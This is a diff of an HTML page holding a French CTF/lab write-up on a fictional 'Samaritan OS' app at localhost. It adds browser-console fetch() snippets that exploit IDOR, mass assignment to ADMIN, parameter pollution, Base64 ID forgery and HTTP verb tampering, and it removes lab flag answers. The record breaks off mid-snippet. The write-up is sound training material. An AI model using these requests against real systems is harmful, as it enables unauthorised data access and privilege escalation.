@@ -537,7 +537,7 @@
   <a href="#1-idor-parametre-aid-sur-le-profil-personnel" class="md-nav__link">
     <span class="md-ellipsis">
       
-        1. IDOR - Paramètre aid sur le profil personnel
+        1. IDOR — Paramètre aid sur le profil personnel
       
     </span>
   </a>
@@ -548,7 +548,7 @@
   <a href="#2-idor-assets-statiques-badges" class="md-nav__link">
     <span class="md-ellipsis">
       
-        2. IDOR - Assets statiques (badges)
+        2. IDOR — Assets statiques (badges)
       
     </span>
   </a>
@@ -658,7 +658,7 @@
   <a href="#bonus-endpoint-cache-non-lie-dans-linterface" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Bonus - Endpoint caché non lié dans l'interface
+        Bonus — Endpoint caché non lié dans l'interface
       
     </span>
   </a>
@@ -1299,7 +1299,7 @@
   <a href="#1-idor-parametre-aid-sur-le-profil-personnel" class="md-nav__link">
     <span class="md-ellipsis">
       
-        1. IDOR - Paramètre aid sur le profil personnel
+        1. IDOR — Paramètre aid sur le profil personnel
       
     </span>
   </a>
@@ -1310,7 +1310,7 @@
   <a href="#2-idor-assets-statiques-badges" class="md-nav__link">
     <span class="md-ellipsis">
       
-        2. IDOR - Assets statiques (badges)
+        2. IDOR — Assets statiques (badges)
       
     </span>
   </a>
@@ -1420,7 +1420,7 @@
   <a href="#bonus-endpoint-cache-non-lie-dans-linterface" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Bonus - Endpoint caché non lié dans l'interface
+        Bonus — Endpoint caché non lié dans l'interface
       
     </span>
   </a>
@@ -1460,135 +1460,194 @@
 
 
 
-<h1 id="methodologie-lab-decima-technologies-samaritan-os-idor-controle-dacces">Méthodologie — Lab Decima Technologies / Samaritan OS (IDOR &amp; Contrôle d'accès)<a class="headerlink" href="#methodologie-lab-decima-technologies-samaritan-os-idor-controle-dacces" title="Permanent link">&para;</a></h1>
-<p><strong>Type d'engagement :</strong> Grey Box Penetration Test<br />
-<strong>Cible :</strong> Samaritan Core Interface (mesh network, nodes opérationnels)<br />
-<strong>Compte de départ :</strong> <code>H_BURROW</code> (ANALYST, ID 20)<br />
+<h1 id="methodologie-lab-decima-technologies-samaritan-os-idor-controle-dacces">Méthodologie — Lab Decima Technologies / Samaritan OS (IDOR &amp; Contrôle d'Accès)<a class="headerlink" href="#methodologie-lab-decima-technologies-samaritan-os-idor-controle-dacces" title="Permanent link">&para;</a></h1>
+<p><strong>Type d'engagement :</strong> Grey Box Penetration Test
+<strong>Cible :</strong> Samaritan Core Interface (mesh network, nodes opérationnels)
+<strong>Compte de départ :</strong> <code>H_BURROW</code> (ANALYST, ID 20)
 <strong>Objectif :</strong> Vérifier l'isolation entre nodes et l'impossibilité d'escalade de privilèges vers le niveau "Overseer"</p>
+<p><strong>Outillage :</strong> l'intégralité de l'audit a été menée depuis le navigateur (Chrome/Edge), sans outil externe (pas de Burp Suite, pas de curl en ligne de commande, pas d'exiftool). Deux surfaces ont suffi :
+- <strong>Barre d'adresse</strong> pour les tests GET rapides et l'observation directe des réponses
+- <strong>DevTools → Console</strong> pour toutes les requêtes <code>fetch()</code> personnalisées (POST, headers custom, payloads JSON), ainsi que pour l'inspection de fichiers binaires (lecture de métadonnées PNG via <code>ArrayBuffer</code>/<code>TextDecoder</code>)
+- <strong>DevTools → Network / Elements</strong> pour la capture des requêtes, l'analyse des headers de réponse et l'édition live du DOM (suppression d'attributs <code>readonly</code>)</p>
+<p>Chrome bloque le collage direct dans la console (anti self-XSS) : taper <code>allow pasting</code> puis Entrée avant de coller un bloc de code est nécessaire à chaque nouvelle session de console.</p>
 <hr />
 <h2 id="resume-executif">Résumé exécutif<a class="headerlink" href="#resume-executif" title="Permanent link">&para;</a></h2>
 <p>12 vulnérabilités identifiées et exploitées, couvrant 4 grandes familles :
-- <strong>Contrôle d'accès brisé (IDOR)</strong> - 4 occurrences, sur des vecteurs différents (paramètre URL, asset statique, header custom)
-- <strong>Validation d'entrée insuffisante côté serveur</strong> - 3 occurrences (mass assignment, HTTP Parameter Pollution, verb tampering)
-- <strong>Exposition d'information</strong> - 2 occurrences (encodage réversible pris pour du chiffrement, fuite d'endpoints internes)
-- <strong>SSRF (Server-Side Request Forgery)</strong> - 2 occurrences, incluant un contournement de blacklist et une forge de requête HTTP via le protocole Gopher</p>
+- <strong>Contrôle d'accès brisé (IDOR)</strong> — 4 occurrences, sur des vecteurs différents (paramètre URL, asset statique, header custom)
+- <strong>Validation d'entrée insuffisante côté serveur</strong> — 3 occurrences (mass assignment, HTTP Parameter Pollution, verb tampering)
+- <strong>Exposition d'information</strong> — 2 occurrences (encodage réversible pris pour du chiffrement, fuite d'endpoints internes)
+- <strong>SSRF (Server-Side Request Forgery)</strong> — 2 occurrences, incluant un contournement de blacklist et une forge de requête HTTP via le protocole Gopher</p>
 <p><strong>Constat transversal :</strong> la quasi-totalité des restrictions observées sont appliquées côté client (JavaScript, attributs HTML <code>readonly</code>) ou reposent sur une simple validation d'existence de ressource, sans vérification d'autorisation réelle côté serveur. C'est le pattern dominant de tout le mesh network Samaritan.</p>
 <hr />
 <h2 id="methodologie-generale-appliquee">Méthodologie générale appliquée<a class="headerlink" href="#methodologie-generale-appliquee" title="Permanent link">&para;</a></h2>
 <ol>
 <li><strong>Cartographie de l'attack surface</strong> : connexion, exploration de l'interface, ouverture systématique des DevTools (onglets Network, Elements, Console) dès la première page.</li>
-<li><strong>Lecture du code source complet</strong> (<code>Ctrl+U</code>) plutôt que l'inspection ponctuelle - un unique passage sur le HTML/JS a révélé la totalité des endpoints, noms de paramètres exacts (<code>aid</code> au lieu de <code>id</code>), champs cachés (<code>user_id</code>), et fonctions JS exposant des routes non liées dans le menu (<code>/admin/control</code>).</li>
-<li><strong>Différenciation des messages d'erreur</strong> comme signal de progression (<code>404</code> -&gt; <code>401</code> -&gt; <code>403</code> -&gt; succès) plutôt que recherche binaire aveugle.</li>
-<li><strong>Triangulation entre challenges</strong> : les prérequis explicites entre étapes (badges -&gt; node ID -&gt; header d'autorisation) imposaient de conserver toute donnée collectée, même en apparence anodine (ex : métadonnées PNG).</li>
-<li><strong>Recours au hint après épuisement des hypothèses raisonnables</strong>, jamais en premier réflexe - cohérent avec la charte du lab.</li>
+<li><strong>Lecture du code source complet</strong> (<code>Ctrl+U</code>) plutôt que l'inspection ponctuelle — un unique passage sur le HTML/JS a révélé la totalité des endpoints, noms de paramètres exacts (<code>aid</code> au lieu de <code>id</code>), champs cachés (<code>user_id</code>), et fonctions JS exposant des routes non liées dans le menu (<code>/admin/control</code>).</li>
+<li><strong>Différenciation des messages d'erreur</strong> comme signal de progression (<code>404</code> → <code>401</code> → <code>403</code> → succès) plutôt que recherche binaire aveugle.</li>
+<li><strong>Triangulation entre challenges</strong> : les prérequis explicites entre étapes (badges → node ID → header d'autorisation) imposaient de conserver toute donnée collectée, même en apparence anodine (ex : métadonnées PNG).</li>
+<li><strong>Recours au hint après épuisement des hypothèses raisonnables</strong>, jamais en premier réflexe — cohérent avec la charte du lab.</li>
 </ol>
 <hr />
 <h2 id="detail-des-vulnerabilites">Détail des vulnérabilités<a class="headerlink" href="#detail-des-vulnerabilites" title="Permanent link">&para;</a></h2>
-<blockquote>
-<p>Les réponses du lab sont masquées ci-dessous. Dépliez uniquement la section concernée si vous voulez vérifier un flag.</p>
-</blockquote>
-<h3 id="1-idor-parametre-aid-sur-le-profil-personnel">1. IDOR - Paramètre <code>aid</code> sur le profil personnel<a class="headerlink" href="#1-idor-parametre-aid-sur-le-profil-personnel" title="Permanent link">&para;</a></h3>
-<p><strong>Endpoint :</strong> <code>GET /interface/profile?aid=&lt;id&gt;</code><br />
-<strong>Constat :</strong> le paramètre <code>aid</code> n'est jamais vérifié par rapport à la session active. N'importe quel ID renvoie la fiche complète de l'utilisateur correspondant.<br />
-<strong>Méthode de découverte :</strong> le nom réel du paramètre (<code>aid</code>, et non <code>id</code>/<code>user_id</code>/<code>uid</code> testés initialement) n'était visible que dans le code source complet (<code>href="/interface/profile?aid=20"</code>), pas dans l'URL affichée par défaut (session-based).<br />
-<strong>Impact :</strong> divulgation de données personnelles (codename, désignation, email, bio) de tout agent, sans authentification différenciée.  </p>
-<details class="success">
-<summary>Réponse / Flag</summary>
-<p><code>FLAG_1{PROFILE_GLITCH_EXPOSED}</code></p>
-</details>
-<h3 id="2-idor-assets-statiques-badges">2. IDOR - Assets statiques (badges)<a class="headerlink" href="#2-idor-assets-statiques-badges" title="Permanent link">&para;</a></h3>
-<p><strong>Endpoint :</strong> <code>GET /static/badges/badge_&lt;id&gt;.png</code><br />
-<strong>Constat :</strong> même faille que #1, appliquée aux fichiers statiques. Aucune vérification que le badge demandé appartient à l'utilisateur courant.<br />
-<strong>Bonus technique :</strong> les fichiers PNG contenaient des métadonnées textuelles en clair (lisibles par simple décodage <code>TextDecoder</code> sur l'<code>ArrayBuffer</code>, sans outil externe type exiftool) : <code>ID</code>, <code>ROLE</code>, <code>ASSIGNED NODE</code>. Cette fuite a été réutilisée comme prérequis du Challenge 9.<br />
-<strong>Impact :</strong> exposition d'assets sensibles et de métadonnées internes (node d'affectation) pour tout utilisateur du système.  </p>
-<details class="success">
-<summary>Réponse / Flag</summary>
-<p><code>FLAG_2{STATIC_ASSET_IDOR}</code></p>
-</details>
+<h3 id="1-idor-parametre-aid-sur-le-profil-personnel">1. IDOR — Paramètre <code>aid</code> sur le profil personnel<a class="headerlink" href="#1-idor-parametre-aid-sur-le-profil-personnel" title="Permanent link">&para;</a></h3>
+<p><strong>Endpoint :</strong> <code>GET /interface/profile?aid=&lt;id&gt;</code>
+<strong>Constat :</strong> le paramètre <code>aid</code> n'est jamais vérifié par rapport à la session active. N'importe quel ID renvoie la fiche complète de l'utilisateur correspondant.
+<strong>Méthode de découverte :</strong> le nom réel du paramètre (<code>aid</code>, et non <code>id</code>/<code>user_id</code>/<code>uid</code> testés initialement) n'était visible que dans le code source complet (<code>href="/interface/profile?aid=20"</code>), pas dans l'URL affichée par défaut (session-based).</p>
+<p><strong>Commande (barre d'adresse) :</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>http://localhost:5000/interface/profile?aid=1
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>http://localhost:5000/interface/profile?aid=21
+</code></pre></div></p>
+<p><strong>Impact :</strong> divulgation de données personnelles (codename, désignation, email, bio) de tout agent, sans authentification différenciée.</p>
+<h3 id="2-idor-assets-statiques-badges">2. IDOR — Assets statiques (badges)<a class="headerlink" href="#2-idor-assets-statiques-badges" title="Permanent link">&para;</a></h3>
+<p><strong>Endpoint :</strong> <code>GET /static/badges/badge_&lt;id&gt;.png</code>
+<strong>Constat :</strong> même faille que #1, appliquée aux fichiers statiques. Aucune vérification que le badge demandé appartient à l'utilisateur courant.
+<strong>Bonus technique :</strong> les fichiers PNG contenaient des métadonnées textuelles en clair, lisibles par simple décodage <code>TextDecoder</code> sur l'<code>ArrayBuffer</code> — sans outil externe type exiftool. Cette fuite a été réutilisée comme prérequis du Challenge 9 (récupération du node du compte DIRECTOR).</p>
+<p><strong>Commande (console) :</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/static/badges/badge_1.png&#39;</span><span class="p">)</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="w">    </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">arrayBuffer</span><span class="p">())</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">    </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">buf</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">TextDecoder</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">fatal</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="w"> </span><span class="p">}).</span><span class="nx">decode</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">matches</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">text</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/[\x20-\x7E]{6,}/g</span><span class="p">);</span>
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">matches</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="nx">matches</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;\n&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;no readable strings found&#39;</span><span class="p">);</span>
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="w">    </span><span class="p">});</span>
+</code></pre></div></p>
+<p><strong>Impact :</strong> exposition d'assets sensibles et de métadonnées internes (node d'affectation) pour tout utilisateur du système.</p>
 <h3 id="3-controle-de-fraicheur-applique-cote-client-uniquement">3. Contrôle de fraîcheur appliqué côté client uniquement<a class="headerlink" href="#3-controle-de-fraicheur-applique-cote-client-uniquement" title="Permanent link">&para;</a></h3>
-<p><strong>Endpoint :</strong> <code>GET /logs/audio/&lt;date&gt;</code><br />
-<strong>Constat :</strong> l'interface affichait une restriction "archives &gt; 24h inaccessibles", mais ce filtre n'existait que dans le JavaScript front-end (<code>fetchLog()</code>). Un appel direct à l'API avec la date exacte du dernier crash système (visible en pied de page : <code>2024-01-01</code>) contournait totalement la restriction.<br />
-<strong>Impact :</strong> accès à des données historiques censées être protégées par une politique de rétention.  </p>
-<details class="success">
-<summary>Réponse / Flag</summary>
-<p><code>FLAG_3{TIME_TRAVELER_FOUND_THE_LOG}</code></p>
-</details>
+<p><strong>Endpoint :</strong> <code>GET /logs/audio/&lt;date&gt;</code>
+<strong>Constat :</strong> l'interface affichait une restriction "archives &gt; 24h inaccessibles", mais ce filtre n'existait que dans le JavaScript front-end (<code>fetchLog()</code>). Un appel direct à l'API avec la date exacte du dernier crash système (visible en pied de page : <code>2024-01-01</code>) contournait totalement la restriction.</p>
+<p><strong>Commande (barre d'adresse) :</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>http://localhost:5000/logs/audio/2024-01-01
+</code></pre></div></p>
+<p><strong>Impact :</strong> accès à des données historiques censées être protégées par une politique de rétention.</p>
 <h3 id="4-mass-assignment-via-champ-formulaire-cacheverrouille-cote-client">4. Mass assignment via champ formulaire caché/verrouillé côté client<a class="headerlink" href="#4-mass-assignment-via-champ-formulaire-cacheverrouille-cote-client" title="Permanent link">&para;</a></h3>
-<p><strong>Endpoint :</strong> <code>POST /update_status</code><br />
-<strong>Constat :</strong> le champ <code>role</code> du formulaire était marqué <code>readonly</code> en HTML - protection purement visuelle. La suppression de l'attribut (DevTools) ou l'envoi direct de la requête (<code>fetch</code>) permettait de soumettre n'importe quelle valeur. La valeur <code>OVERSEER</code> était rejetée silencieusement (validation partielle non documentée), mais <code>ADMIN</code> était acceptée sans contrôle.<br />
-<strong>Point méthodologique :</strong> un rejet silencieux (pas d'erreur, mais pas d'effet) est un signal à ne pas confondre avec "endpoint non exploitable" - il indique une validation existante mais incomplète, qu'il faut cartographier valeur par valeur.<br />
-<strong>Impact :</strong> élévation de privilèges via manipulation d'un champ non protégé côté serveur.  </p>
-<details class="success">
-<summary>Réponse / Flag</summary>
-<p><code>FLAG_4{HIDDEN_POST_PARAM_FOUND}</code></p>
-</details>
+<p><strong>Endpoint :</strong> <code>POST /update_status</code>
+<strong>Constat :</strong> le champ <code>role</code> du formulaire était marqué <code>readonly</code> en HTML — protection purement visuelle. L'envoi direct de la requête via <code>fetch()</code> contournait cette protection sans même avoir besoin d'éditer le DOM. La valeur <code>OVERSEER</code> était rejetée silencieusement (validation partielle non documentée), mais <code>ADMIN</code> était acceptée sans contrôle.
+<strong>Point méthodologique :</strong> un rejet silencieux (pas d'erreur, mais pas d'effet) est un signal à ne pas confondre avec "endpoint non exploitable" — il indique une validation existante mais incomplète, qu'il faut cartographier valeur par valeur.</p>
+<p><strong>Commande (console) :</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/update_status&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="w">    </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="p">,</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="w">    </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">URLSearchParams</span><span class="p">({</span><span class="w"> </span><span class="nx">mood</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;STABLE&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">role</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;ADMIN&#39;</span><span class="w"> </span><span class="p">})</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="p">})</span>
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">text</span><span class="p">())</span>
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">t</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">t</span><span class="p">));</span>
+</code></pre></div></p>
+<p><strong>Impact :</strong> élévation de privilèges via manipulation d'un champ non protégé côté serveur.</p>
 <h3 id="5-http-parameter-pollution-hpp">5. HTTP Parameter Pollution (HPP)<a class="headerlink" href="#5-http-parameter-pollution-hpp" title="Permanent link">&para;</a></h3>
-<p><strong>Endpoint :</strong> <code>POST /ticket/create</code><br />
-<strong>Constat :</strong> l'envoi d'un <code>user_id</code> unique différent du sien déclenchait un contrôle explicite ("ID MISMATCH"). L'envoi du <strong>même paramètre en double</strong> (<code>user_id=20&amp;user_id=1</code>) contournait ce contrôle : le serveur valide vraisemblablement la première occurrence mais utilise la dernière pour l'action réelle - un désaccord classique entre couche de validation et couche métier dans le parsing des paramètres dupliqués.<br />
-<strong>Impact :</strong> création de ressources (tickets) au nom d'un autre utilisateur malgré un contrôle d'identité apparent.  </p>
-<details class="success">
-<summary>Réponse / Flag</summary>
-<p><code>FLAG_5{HPP_DOUBLE_PARAMETER_MASTERY}</code></p>
-</details>
+<p><strong>Endpoint :</strong> <code>POST /ticket/create</code>
+<strong>Constat :</strong> l'envoi d'un <code>user_id</code> unique différent du sien déclenchait un contrôle explicite ("ID MISMATCH"). L'envoi du <strong>même paramètre en double</strong> contournait ce contrôle : le serveur valide vraisemblablement la première occurrence mais utilise la dernière pour l'action réelle — un désaccord classique entre couche de validation et couche métier dans le parsing des paramètres dupliqués.</p>
+<p><strong>Commande (console) :</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/ticket/create&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="w">    </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="p">,</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="w">    </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="w"> </span><span class="p">},</span>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="w">    </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;user_id=20&amp;user_id=1&amp;message=test+anomaly+report&#39;</span>
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="p">})</span>
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">text</span><span class="p">())</span>
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">t</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">t</span><span class="p">));</span>
+</code></pre></div></p>
+<p><strong>Impact :</strong> création de ressources (tickets) au nom d'un autre utilisateur malgré un contrôle d'identité apparent.</p>
 <h3 id="6-encodage-confondu-avec-du-chiffrement">6. Encodage confondu avec du chiffrement<a class="headerlink" href="#6-encodage-confondu-avec-du-chiffrement" title="Permanent link">&para;</a></h3>
-<p><strong>Endpoint :</strong> <code>GET /intel/download/&lt;hash&gt;</code><br />
-<strong>Constat :</strong> le "hash" affiché (<code>dXNlcl8yMA==</code>) était en réalité du Base64 trivial, décodable en clair (<code>user_20</code>). Le pattern <code>user_&lt;id&gt;</code> étant déductible, il suffisait d'encoder <code>user_&lt;autre_id&gt;</code> pour télécharger le manuel confidentiel de n'importe quel agent.<br />
-<strong>Impact secondaire :</strong> ce manuel exposait lui-même un endpoint interne non documenté (<code>POST /api/v2/promote</code>), utilisé pour l'exploitation du Challenge 8 - illustration d'un effet de cascade où une fuite d'information de faible sévérité alimente une vulnérabilité critique en aval.  </p>
-<details class="success">
-<summary>Réponse / Flag</summary>
-<p><code>FLAG_6{BASE64_IS_NOT_ENCRYPTION}</code></p>
-</details>
+<p><strong>Endpoint :</strong> <code>GET /intel/download/&lt;hash&gt;</code>
+<strong>Constat :</strong> le "hash" affiché (<code>dXNlcl8yMA==</code>) était en réalité du Base64 trivial, décodable en clair (<code>user_20</code>). Le pattern <code>user_&lt;id&gt;</code> étant déductible, il suffisait d'encoder <code>user_&lt;autre_id&gt;</code> pour télécharger le manuel confidentiel de n'importe quel agent.
+<strong>Impact secondaire :</strong> ce manuel exposait lui-même un endpoint interne non documenté (<code>POST /api/v2/promote</code>), utilisé pour l'exploitation du Challenge 8 — illustration d'un effet de cascade où une fuite d'information de faible sévérité alimente une vulnérabilité critique en aval.</p>
+<p><strong>Commandes (console) :</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1">// Décodage du format</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">atob</span><span class="p">(</span><span class="s1">&#39;dXNlcl8yMA==&#39;</span><span class="p">));</span><span class="w">  </span><span class="c1">// -&gt; user_20</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="c1">// Encodage d&#39;un ID cible et téléchargement</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="kd">const</span><span class="w"> </span><span class="nx">target</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">btoa</span><span class="p">(</span><span class="s1">&#39;user_1&#39;</span><span class="p">);</span>
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/intel/download/&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">target</span><span class="p">)</span>
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="w">    </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">text</span><span class="p">())</span>
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="w">    </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">t</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">t</span><span class="p">));</span>
+</code></pre></div></p>
+<p><strong>Impact :</strong> divulgation de documentation confidentielle et fuite d'endpoint interne critique.</p>
 <h3 id="7-http-verb-tampering">7. HTTP Verb Tampering<a class="headerlink" href="#7-http-verb-tampering" title="Permanent link">&para;</a></h3>
-<p><strong>Endpoint :</strong> <code>/logs/sys/555</code><br />
-<strong>Constat :</strong> la méthode <code>GET</code> déclenchait un message de restriction. Une requête <code>OPTIONS</code> a révélé les méthodes réellement acceptées par la route (header <code>Allow: OPTIONS, HEAD, GET, DELETE</code>) - <code>DELETE</code> n'était soumis à aucun contrôle d'accès et retournait le contenu protégé.<br />
-<strong>Point méthodologique :</strong> systématiser une requête <code>OPTIONS</code> sur toute route protégée fait partie des premiers réflexes à avoir - le header <code>Allow</code> liste souvent des méthodes non prévues par les développeurs pour un usage "lecture", révélant des incohérences de contrôle d'accès par verbe.<br />
-<strong>Impact :</strong> contournement total d'une restriction d'accès en changeant simplement le verbe HTTP.  </p>
-<details class="success">
-<summary>Réponse / Flag</summary>
-<p><code>FLAG_7{HTTP_VERB_TAMPERING_MASTER}</code></p>
-</details>
+<p><strong>Endpoint :</strong> <code>/logs/sys/555</code>
+<strong>Constat :</strong> la méthode <code>GET</code> déclenchait un message de restriction. Une requête <code>OPTIONS</code> a révélé les méthodes réellement acceptées par la route (header <code>Allow: OPTIONS, HEAD, GET, DELETE</code>) — <code>DELETE</code> n'était soumis à aucun contrôle d'accès et retournait le contenu protégé.
+<strong>Point méthodologique :</strong> systématiser une requête <code>OPTIONS</code> sur toute route protégée fait partie des premiers réflexes à avoir — le header <code>Allow</code> liste souvent des méthodes non prévues par les développeurs pour un usage "lecture", révélant des incohérences de contrôle d'accès par verbe.</p>
+<p><strong>Commandes (console) :</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1">// Reconnaissance des verbes acceptés</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/logs/sys/555&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;OPTIONS&#39;</span><span class="w"> </span><span class="p">})</span>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="w">    </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Allow:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">headers</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;Allow&#39;</span><span class="p">)));</span>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="c1">// Exploitation</span>
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/logs/sys/555&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;DELETE&#39;</span><span class="w"> </span><span class="p">})</span>
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="w">    </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">text</span><span class="p">())</span>
